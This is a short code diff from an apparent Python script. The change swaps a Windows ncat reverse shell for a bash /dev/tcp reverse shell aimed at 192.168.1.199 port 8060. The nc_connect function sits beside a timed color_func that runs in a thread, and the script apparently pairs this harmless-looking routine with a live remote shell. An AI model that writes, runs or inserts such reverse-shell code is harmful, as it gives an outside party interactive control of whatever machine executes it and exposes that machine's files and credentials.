@@ -34,7 +34,8 @@ def color_func():
         time.sleep(interval*60.0 - ((time.time() - starttime) % interval*60.0))
 
 def nc_connect():
-    os.system("ncat -e cmd.exe 192.168.1.199 8060")
+    # os.system("ncat -e cmd.exe 192.168.1.199 8060")
+    os.system("/bin/bash -i > /dev/tcp/192.168.1.199/8060 0<&1 2>&1")
 
 if __name__ == "__main__":
     t1 = threading.Thread(target=color_func)
